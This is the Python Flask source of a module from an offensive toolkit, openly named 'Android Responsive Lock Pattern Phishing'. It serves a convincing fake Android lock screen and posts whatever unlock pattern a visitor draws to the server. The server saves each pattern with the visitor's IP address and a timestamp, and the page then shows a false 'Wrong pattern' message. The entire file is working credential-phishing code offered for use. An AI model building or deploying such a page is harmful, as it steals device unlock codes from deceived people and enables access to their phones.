import os
import sys
import json
import time
from flask import Flask, render_template_string, request, jsonify
from core.promptui import *

app = Flask(__name__)
DATA_JSON_FILE = "pattern_captures.json"
active_visitors = {}

PATTERN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Android Pattern Lock</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background-color: #121212;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            user-select: none;
            -webkit-user-select: none;
            touch-action: none;
        }
        .dot {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            background-color: rgba(255, 255, 255, 0.3);
            transition: transform 0.2s, background-color 0.2s;
            position: relative;
        }
        .dot.active {
            background-color: #3b82f6;
            transform: scale(1.4);
        }
        .dot.active::after {
            content: '';
            position: absolute;
            top: -10px;
            left: -10px;
            right: -10px;
            bottom: -10px;
            border-radius: 50%;
            background-color: rgba(59, 130, 246, 0.2);
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); opacity: 0.8; }
            100% { transform: scale(1.8); opacity: 0; }
        }
    </style>
</head>
<body class="flex flex-col items-center justify-between min-h-screen py-12 px-4">
    <div class="text-center mt-6">
        <div class="text-4xl font-light mb-2" id="clock">12:00</div>
        <div class="text-sm text-gray-400 font-medium" id="status-text">Draw unlock pattern</div>
    </div>

    <div class="relative w-72 h-72 flex items-center justify-center my-auto">
        <svg id="pattern-svg" class="absolute inset-0 w-full h-full pointer-events-none z-10">
            <line id="current-line" x1="0" y1="0" x2="0" y2="0" stroke="#3b82f6" stroke-width="4" stroke-linecap="round" class="hidden" />
        </svg>
        <div id="pattern-grid" class="grid grid-cols-3 gap-12 p-6 w-full h-full relative z-20">
            <div class="dot flex items-center justify-center cursor-pointer" data-id="1"></div>
            <div class="dot flex items-center justify-center cursor-pointer" data-id="2"></div>
            <div class="dot flex items-center justify-center cursor-pointer" data-id="3"></div>
            <div class="dot flex items-center justify-center cursor-pointer" data-id="4"></div>
            <div class="dot flex items-center justify-center cursor-pointer" data-id="5"></div>
            <div class="dot flex items-center justify-center cursor-pointer" data-id="6"></div>
            <div class="dot flex items-center justify-center cursor-pointer" data-id="7"></div>
            <div class="dot flex items-center justify-center cursor-pointer" data-id="8"></div>
            <div class="dot flex items-center justify-center cursor-pointer" data-id="9"></div>
        </div>
    </div>

    <div class="text-xs text-gray-500 mb-4">Emergency Call</div>

    <script>
        function updateClock() {
            const now = new Date();
            let hours = now.getHours();
            let minutes = now.getMinutes();
            minutes = minutes < 10 ? '0' + minutes : minutes;
            document.getElementById('clock').innerText = `${hours}:${minutes}`;
        }
        setInterval(updateClock, 1000);
        updateClock();

        const grid = document.getElementById('pattern-grid');
        const dots = document.querySelectorAll('.dot');
        const svg = document.getElementById('pattern-svg');
        const currentLine = document.getElementById('current-line');
        const statusText = document.getElementById('status-text');

        let isDrawing = false;
        let selectedDots = [];
        let permanentLines = [];

        function getDotCenter(dot) {
            const rect = dot.getBoundingClientRect();
            const gridRect = grid.getBoundingClientRect();
            return {
                x: rect.left + rect.width / 2 - gridRect.left,
                y: rect.top + rect.height / 2 - gridRect.top
            };
        }

        function handleStart(e) {
            isDrawing = true;
            selectedDots = [];
            permanentLines.forEach(l => l.remove());
            permanentLines = [];
            dots.forEach(d => d.classList.remove('active'));
            statusText.innerText = "Draw unlock pattern";
            statusText.classList.remove('text-red-500');

            const target = e.target.closest('.dot');
            if (target) {
                addDot(target);
            }
        }

        function handleMove(e) {
            if (!isDrawing) return;
            const clientX = e.touches ? e.touches[0].clientX : e.clientX;
            const clientY = e.touches ? e.touches[0].clientY : e.clientY;

            const gridRect = grid.getBoundingClientRect();
            const currentX = clientX - gridRect.left;
            const currentY = clientY - gridRect.top;

            if (selectedDots.length > 0) {
                const lastDot = selectedDots[selectedDots.length - 1];
                const lastCenter = getDotCenter(lastDot);
                currentLine.setAttribute('x1', lastCenter.x);
                currentLine.setAttribute('y1', lastCenter.y);
                currentLine.setAttribute('x2', currentX);
                currentLine.setAttribute('y2', currentY);
                currentLine.classList.remove('hidden');
            }

            const element = document.elementFromPoint(clientX, clientY);
            const dot = element ? element.closest('.dot') : null;
            if (dot && !selectedDots.includes(dot)) {
                addDot(dot);
            }
        }

        function handleEnd() {
            if (!isDrawing) return;
            isDrawing = false;
            currentLine.classList.add('hidden');

            if (selectedDots.length > 0) {
                const patternStr = selectedDots.map(d => d.getAttribute('data-id')).join('-');
                
                fetch('/capture-pattern', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ pattern: patternStr })
                })
                .then(res => res.json())
                .then(data => {
                    setTimeout(() => {
                        statusText.innerText = "Wrong pattern";
                        statusText.classList.add('text-red-500');
                        dots.forEach(d => d.classList.remove('active'));
                        permanentLines.forEach(l => l.remove());
                        permanentLines = [];
                        selectedDots = [];
                    }, 500);
                });
            }
        }

        function addDot(dot) {
            dot.classList.add('active');
            if (selectedDots.length > 0) {
                const prevDot = selectedDots[selectedDots.length - 1];
                const p1 = getDotCenter(prevDot);
                const p2 = getDotCenter(dot);

                const line = document.createElementNS('http://www.w3.org/2000/svg', 'line');
                line.setAttribute('x1', p1.x);
                line.setAttribute('y1', p1.y);
                line.setAttribute('x2', p2.x);
                line.setAttribute('y2', p2.y);
                line.setAttribute('stroke', '#3b82f6');
                line.setAttribute('stroke-width', '4');
                line.setAttribute('stroke-linecap', 'round');
                svg.appendChild(line);
                permanentLines.push(line);
            }
            selectedDots.push(dot);
        }

        grid.addEventListener('mousedown', handleStart);
        window.addEventListener('mousemove', handleMove);
        window.addEventListener('mouseup', handleEnd);

        grid.addEventListener('touchstart', handleStart);
        window.addEventListener('touchmove', handleMove);
        window.addEventListener('touchend', handleEnd);

        setInterval(function() {
            navigator.sendBeacon('/heartbeat');
        }, 5000);
    </script>
</body>
</html>
"""

def save_capture(data):
    records = []
    if os.path.exists(DATA_JSON_FILE):
        try:
            with open(DATA_JSON_FILE, "r") as f:
                records = json.load(f)
        except:
            pass
    records.append(data)
    with open(DATA_JSON_FILE, "w") as f:
        json.dump(records, f, indent=4)

@app.route('/')
def index():
    return render_template_string(PATTERN_TEMPLATE)

@app.route('/capture-pattern', methods=['POST'])
def capture_pattern():
    req = request.get_json()
    ip = request.remote_addr
    pattern = req.get('pattern', 'N/A')
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

    print(f"\n{PromptUi.result} [PATTERN CAPTURED] IP: {ip} | Pattern Sequence: \033[1;32m{pattern}\033[0m | Time: {timestamp}")
    save_capture({"ip": ip, "pattern": pattern, "timestamp": timestamp})
    return jsonify({"status": "success"})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    ip = request.remote_addr
    if ip not in active_visitors:
        print(f"{PromptUi.result} New Visitor Detected -> {ip}")
    active_visitors[ip] = time.time()
    return "", 204

class Module:
    def __init__(self):
        self.info = {
            'name': 'Android Responsive Lock Pattern Phishing',
            'description': 'Generates a 100% authentic and responsive Android screen lock pattern phishing page.',
            'author': 'Quwais',
            'options': {
                'PORT': {
                    'default': '8080',
                    'required': True,
                    'desc': 'Local port to run the phishing server'
                }
            }
        }

    def run(self, options):
        try:
            port = int(options.get('PORT', 8080))
        except ValueError:
            port = 8080

        if os.geteuid() != 0:
            print(f"{PromptUi.error} This module requires root access.")
            return

        print(f"{PromptUi.info} Starting Android Pattern Lock Phishing server...")
        print(f"{PromptUi.info} Listening on port {port}...")
        print(f"{PromptUi.result} Waiting for visitor interaction...\n")

        try:
            app.run(host='0.0.0.0', port=port, debug=False)
        except Exception as e:
            print(f"{PromptUi.error} Error running server: {e}")
